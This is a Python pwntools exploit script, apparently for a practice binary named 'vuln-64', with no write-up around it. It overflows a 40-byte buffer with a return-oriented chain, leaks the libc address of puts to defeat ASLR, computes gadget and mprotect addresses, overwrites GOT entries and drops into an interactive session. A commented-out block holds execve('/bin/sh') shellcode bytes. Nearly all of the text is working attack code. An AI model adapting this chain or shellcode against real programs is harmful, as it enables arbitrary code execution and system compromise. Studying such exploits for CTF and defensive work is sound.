import pwn

process = pwn.gdb.debug('./vuln-64')
#process = pwn.process('./vuln-64')

# addr of puts got entry again !! try with 0x401030 and 0x401141
# jump to pop rdi; ret values on the stack: 0x404000 
# jump to pop rsi; ret values on the stack: 4096 bytes
# jump to pop rdx; ret values on the stack: 7

# ROP Flow chart
# pop rdi; ret gadget of puts got address
# call puts to leak aslr
# pop rdi; ret gadget of puts got address
# call gets to write shellcode
# pop rdi; ret
# pop rsi;
# pop rdx;
# call mprotect using aslr bypass leak
# pop rdi addr of puts got address
# call puts address

# Payload formation

# 40 byte buffer
payload = b'g' * 40
# pop rdi; ret gadget
payload += pwn.p64(0x4011cb)
# puts got address
payload += pwn.p64(0x404018)
# call PUTS
payload += pwn.p64(0x401030)
# prepload ALL THREE INTO PUTS + 16
payload += pwn.p64(0x4011cb)
payload += pwn.p64(0x404018)
payload += pwn.p64(0x401040) # CALL TO GETS

# load in the registers here
# 	rdi ( value of 0x404000) where to change
payload += pwn.p64(0x4011cb)
payload += pwn.p64(0x404000)
# 	rsi ( value of 0x1000) how many bytes to change
payload += pwn.p64(0x4011c9)
payload += pwn.p64(0x1000)
payload += pwn.p64(0x0)
# 	rdx ( value of 7 ) the permission byte to change it to ( read write execute )
payload += pwn.p64(0x401030) # call to fake puts which is pop rdx
payload += pwn.p64(0x7) # real rdx value
payload += pwn.p64(0x67) # fake register value
payload += pwn.p64(0x67) # fake reg value
payload += pwn.p64(0x67) # fake
payload += pwn.p64(0x67) # fake value
payload += pwn.p64(0x401040) # fake GETS call to mprotect call

# manually calling gets through aslr leak
payload += pwn.p64(0x4011cb)
payload += pwn.p64(0x404018)



# debug line
payload += pwn.p64(0x401132)

process.recvuntil(b'\n')
process.sendline(payload) # GETS CALL NO 1
leakedPUTSLIBC = int(process.recvuntil(b'\n')[:-1][::-1].hex(), 16)
print("[+] Leaked PUTS: " + str(hex(leakedPUTSLIBC)))
aslrBypass = leakedPUTSLIBC - 0x87be0
print("[+] Leaked ASLRBase: " + str(hex(aslrBypass)))
# load THREE GADGETS INTO GOT; GETS CALL NO 2
# calculate RSI ADDR NO NEED!!
## POP_RSI = aslrBypass + 0xfcf3c
# calculate pop rdx
POP_RDX = aslrBypass + 0xb503c
# calculate MPROTECT
MPROTECT = aslrBypass + 0x125c40

input1 = pwn.p64(POP_RDX)
input1 += pwn.p64(MPROTECT)
print("Addr POP_RDX: " + str(hex(POP_RDX)))
print("Addr MPROTECT: " + str(hex(MPROTECT)))
process.sendline(input1)
process.interactive()
# ABANDONED (tried to write shellcode in got table, but only 2 entires exist, not realistic in actual practice.
'''
payload = b'\x48\x31\xd2\x6a\x3b\x58\x68\x2c\x40\x40\x00\x5f\x68\x34\x40\x40\x00\x5e\x0f\x05'
payload += b'/bin/sh\x00'
payload += pwn.p64(0x40402c)
payload += pwn.p64(0)
print("payload bytes:", [hex(b) for b in payload])
print(len(payload))
process.sendline(payload)
process.interactive()
'''
